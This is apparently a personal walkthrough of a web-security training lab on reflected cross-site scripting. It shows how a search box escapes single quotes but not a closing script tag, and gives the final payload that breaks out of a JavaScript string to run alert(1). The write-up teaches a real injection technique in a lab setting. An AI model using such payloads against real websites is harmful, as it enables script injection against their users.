Link: [Reflected XSS into a JavaScript string with single quote and backslash escaped]()
Difficulty: Practitioner

# Recon
As the title dictate, I will use this payload to test in the search box
```
test'payload
```

Noticing that the single quote is being escaped with `\`
<img width="857" height="63" alt="Screenshot_20261015_160244" src="https://github.com/user-attachments/assets/e3b45008-04d0-4701-bd00-e99da895220a" />

Now, I will try to include the end tag of the script to see whether it being filter or not
```
</script>
```
<img width="827" height="239" alt="Screenshot_20261015_160414" src="https://github.com/user-attachments/assets/3ebcf66a-8aff-47d2-bcb9-15d98a3a751e" />
<img width="818" height="65" alt="Screenshot_20261015_160428" src="https://github.com/user-attachments/assets/6d58644e-5335-4f81-ad83-d5ec1f033b8c" />

Paying close attention to the script tag, I realize the the end tag of script would not be filtered out. It's time to craft the payload

# Action
```
</script><script>alert(1)</script>
```

This would trigger the Reflected XSS because the search will take the user input directly into the existing HTML page and close the </script> tag without any sanitization. Then trigger the `alert()` function.


Happy Hacking!@#!@#!
